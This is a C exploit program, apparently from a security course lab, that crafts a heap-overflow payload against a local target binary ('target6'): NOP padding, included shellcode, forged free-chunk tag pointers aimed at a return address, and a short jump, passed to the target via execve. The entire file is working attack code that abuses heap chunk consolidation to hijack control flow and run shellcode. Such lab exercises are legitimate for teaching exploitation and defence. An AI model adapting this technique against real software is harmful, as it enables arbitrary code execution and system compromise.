#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target6"

int main(void)
{
  char *args[3];
  char *env[1];

  char temp[192];
	char ra[] = "\xa8\xfe\x21\x20";
  char sh[] = "\x48\xec\x04\x01";
	int i;
	for(i=0;i<192;i++){
    if (i<8) temp[i]=0x90; //leave a chunk tag space
		else if (i<53) temp[i]=shellcode[i-8];
    else if (i<72) temp[i]=0x90; 
    else if (i<76) temp[i]=sh[i-72]; //left pointer of tag to where shellcode lies
		else if (i<80) temp[i]=ra[i-76]; //right pointer of tag to foo's return address
    else temp[i]=0x90;
	}
  temp[4]=0x01; //set a bit to 1 to indicate a free chunk behind to let the second free q instruction have something to consolidate
  temp[0]='\xeb'; temp[1]='\x08'; //jmp to shellcode

  args[0] = TARGET; args[1] = temp; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
